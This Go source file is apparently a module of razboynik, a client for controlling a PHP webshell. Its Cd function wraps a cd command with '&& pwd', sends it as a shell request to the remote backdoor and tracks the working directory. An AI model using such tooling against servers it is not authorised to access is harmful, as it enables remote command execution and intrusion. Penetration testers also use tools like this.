package shellmodule

import (
	"strings"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboy/adapter/phpadapter"
	"github.com/eatbytes/razboy/core"
	"github.com/eatbytes/razboynik/services/kernel"
)

func Cd(kc *kernel.KernelCmd, request *core.REQUEST) (*kernel.KernelCmd, error) {
	var (
		rzRes *razboy.RazResponse
		scope string
		err   error
	)

	if strings.Contains(kc.GetRaw(), "&&") || kc.GetArrItem(1, "") == "-" {
		return Raw(kc, request)
	}

	request.Type = "SHELL"
	request.SHLc.Cmd = kc.GetRaw() + " && pwd"
	phpadapter.CreateCMD(request.SHLc)

	request.Build()

	rzRes, err = razboy.Send(request)
	kc.SetResult(rzRes)

	if err != nil {
		return kc, err
	}

	scope = strings.TrimSpace(kc.GetResult())

	if scope != "" {
		kc.SetScope(scope)
	}

	return kc, nil
}
